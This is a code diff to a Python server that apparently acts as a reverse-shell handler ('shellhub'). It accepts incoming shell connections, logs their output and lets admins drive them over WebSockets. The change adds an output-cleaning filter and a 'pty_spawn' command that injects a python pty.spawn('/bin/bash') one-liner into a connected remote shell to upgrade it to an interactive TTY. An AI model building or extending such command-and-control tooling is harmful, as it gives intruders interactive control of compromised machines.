@@ -1,4 +1,5 @@
 import asyncio
+import re
 import sqlite3
 import time
 import uuid
@@ -10,6 +11,14 @@ import uvicorn
 tcp_sessions = {}
 admin_connections = set()
 VALID_META_FIELDS = {"name", "notes", "flags"}
+
+NON_TTY_RE = re.compile(r"[\x00\x08\x0b\x0c\x0e-\x1f\x7f]")
+
+def clean_output(text):
+    text = text.replace("\r\n", "\n")
+    text = text.replace("\r", "\n")
+    text = NON_TTY_RE.sub("", text)
+    return text
 
 def init_db():
     with sqlite3.connect("shellhub.db") as conn:
@@ -87,8 +96,9 @@ async def handle_tcp(reader, writer):
             data = await reader.read(4096)
             if not data:
                 break
-            text = data.decode("utf-8", errors="replace")
-            save_command(sid, "output", text)
+            raw = data.decode("utf-8", errors="replace")
+            text = clean_output(raw)
+            save_command(sid, "output", raw)
             for ws in list(admin_connections):
                 if getattr(ws, "watching", None) == sid:
                     try:
@@ -165,6 +175,13 @@ async def ws_endpoint(ws: WebSocket):
                 s = tcp_sessions.get(msg.get("session_id"))
                 if s:
                     s["raw_mode"] = msg.get("data", False)
+            elif t == "pty_spawn":
+                s = tcp_sessions.get(msg.get("session_id"))
+                if s:
+                    payload = msg.get("payload", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
+                    data = payload + "\n"
+                    s["writer"].write(data.encode())
+                    await s["writer"].drain()
             elif t == "input":
                 s = tcp_sessions.get(msg.get("session_id"))
                 if s:
